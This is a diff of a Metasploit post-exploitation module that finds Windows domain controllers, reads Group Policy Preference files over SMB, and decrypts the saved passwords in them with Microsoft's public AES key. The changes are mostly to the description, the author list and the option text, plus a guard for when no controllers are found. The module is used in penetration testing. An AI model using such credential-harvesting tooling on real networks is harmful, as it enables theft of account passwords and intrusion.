@@ -15,12 +15,12 @@ class Metasploit3 < Msf::Post
 
 	def initialize(info={})
 		super( update_info( info,
-			'Name'          => 'Windows Gather Group Policy Preferences Saved Password Extraction',
+			'Name'          => 'Windows Gather Group Policy Preference Saved Passwords',
 			'Description'   => %q{
 				This module enumerates the victim machine's domain controller and
 				connects to it via SMB. It then looks for Group Policy Preference XML
-				files containing local user accounts and passwords. It then parses the
-				XML files and decrypts the passwords.
+				files containing local user accounts and passwords and decrypts them
+				using Microsofts public AES key.
 
 				Users can specify DOMAINS="domain1 domain2 domain3 etc" to target specific
 				domains on the network. This module will enumerate any domain controllers for
@@ -29,14 +29,19 @@ class Metasploit3 < Msf::Post
 				Users can specify ALL=True to target all domains and their domain controllers
 				on the network.
 
-				Utilizes code from enum_domain and enum_domains post modules.
+				Tested directly on a Win2k8 x64 DC, Win2k12RC x64 DC, and a Windows 7 x32 Client
+				Workstation.
+
+				Using the ALL or DOMAINS flags whilst on a DC will not enumerate that DC as it
+				is looking externally on the network for other Domain Controllers, however the
+				default (CURRENT=True which inspects the registry) should work successfully.
 			},
 			'License'       => MSF_LICENSE,
 			'Author'        =>[
 				'Ben Campbell <eat_meatballs[at]hotmail.co.uk>',
 				'Loic Jaquemet <loic.jaquemet+msf[at]gmail.com>',
 				'scriptmonkey <scriptmonkey[at]owobble.co.uk>',
-				'TheLightCosine <thelightcosine[at]gmail.com'
+				'TheLightCosine <thelightcosine[at]gmail.com>'
 				],
 			'References'    =>
 				[
@@ -53,7 +58,7 @@ class Metasploit3 < Msf::Post
 			[
 				OptBool.new('CURRENT', [ false, 'Enumerate current machine domain.', true]),
 				OptBool.new('ALL', [ false, 'Enumerate all domains on network.', false]),
-				OptString.new('DOMAINS', [false, 'Enumerate list of space seperated domains - DOMAINS="domain1 domain2 etc".']),
+				OptString.new('DOMAINS', [false, 'Enumerate list of space seperated domains DOMAINS="dom1 dom2".']),
 			], self.class)
 	end
 
@@ -103,6 +108,11 @@ class Metasploit3 < Msf::Post
 		end
 
 		dcs = dcs.flatten.compact
+
+		if dcs.length < 1
+			return nil
+		end
+
 		dcs.each do |dc|
 			print_status "Searching on #{dc}..."
 			sysvol_path = "\\\\#{dc}\\SYSVOL\\"
